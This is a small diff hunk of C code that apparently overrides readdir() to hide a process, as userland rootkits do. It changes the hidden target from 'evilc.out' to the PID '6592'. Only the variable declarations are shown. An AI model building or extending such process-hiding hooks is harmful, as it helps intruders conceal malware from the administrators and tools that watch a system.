@@ -19,7 +19,7 @@ struct dirent *readdir (DIR * dirp){
 
      DIR *directory;
      DIR *subdirectory;
-     static const char* hide_process = "evilc.out";
+     static const char* hide_process = "6592";
      // will store pointer to each entry in the directory
      struct dirent *entry;
      
